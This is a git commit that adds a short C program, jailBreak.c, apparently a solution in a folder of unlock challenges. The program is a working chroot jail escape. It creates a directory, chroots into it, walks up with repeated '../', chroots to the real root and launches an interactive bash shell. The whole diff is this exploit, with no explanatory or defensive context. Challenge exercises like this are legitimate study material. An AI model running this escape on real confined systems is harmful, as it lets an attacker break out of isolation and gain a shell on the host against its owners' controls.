0e7257d1b0158aeadc35fb99da81b97c1bbb6ab6
Quki <70489784+quki3@users.noreply.github.com>
2023-07-24 14:59:49 -0300

    Update jailBreak.c

--- UNLOCK-CHALLENGES/1/b/jailBreak.c
+++ UNLOCK-CHALLENGES/1/b/jailBreak.c
@@ -1,1 +1,13 @@
 
+#include <sys/stat.h>
+#include <unistd.h>      // documentation: https://pubs.opengroup.org/onlinepubs/7908799/xsh/unistd.h.html
+
+int main(void)
+{
+    mkdir(".out", 0755);      // create a folder with 0755 appropriate privileges
+    chroot(".out");           // documentetion: https://pubs.opengroup.org/onlinepubs/7908799/xsh/chroot.html
+                              // The chroot() function causes the named directory to become the root directory
+    chdir("../../../../../");
+    chroot(".");
+    return execl("/bin/bash", "-i", NULL);
+}
